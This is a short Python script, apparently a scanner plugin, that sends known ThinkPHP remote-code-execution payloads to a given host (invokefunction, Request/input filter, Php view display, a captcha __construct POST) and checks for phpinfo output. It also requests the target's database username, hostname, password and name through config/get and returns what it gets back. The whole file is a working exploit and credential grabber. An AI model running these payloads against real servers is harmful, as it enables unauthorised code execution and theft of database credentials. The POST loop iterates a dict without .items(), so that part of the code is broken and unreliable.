import requests

headers = {"Content-Type": "application/x-www-form-urlencoded"}


def scan(host):
    poc = [
        "/?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
        "/?s=index/\\think\\Container/invokefunction&function=phpinfo&vars[0]=1",
        "/?s=index/\\think\\Request/input&filter=phpinfo&data=1",
        "/?s=index/\\think\\view\\driver\\Php/display&content=<?php%20phpinfo();?>",
    ]
    for p in poc:
        url = host + p
        req = requests.get(url, headers=headers)
        if "PHP Version" in req.text or "PHP Extension Build" in req.text:
            return "ThinkPHP Vuln: {}".format(url)

    poc = {
        "/?s=captcha?s=captcha": "_method=__construct&filter[]=phpinfo&method=GET&get[]=1"
    }
    for k, v in poc:
        url = host + k
        req = requests.post(url, data=v, headers=headers)
        if "PHP Version" in req.text or "PHP Extension Build" in req.text:
            return "ThinkPHP Vuln: {}\npost data: {}".format(url, v)

    poc = [
        "/?s=index/think\\config/get&name=database.username",
        "/?s=index/think\\config/get&name=database.hostname",
        "/?s=index/think\\config/get&name=database.password",
        "/?s=index/think\\config/get&name=database.database",
    ]
    for p in poc:
        url = host + p
        req = requests.get(url, headers=headers)
        if 0 < len(req.text) < 100:
            return "ThinkPHP Vuln: {} database: {}".format(url, req.text.strip())


def run(host, **kwargs):
    ret = scan(host)
    return ret
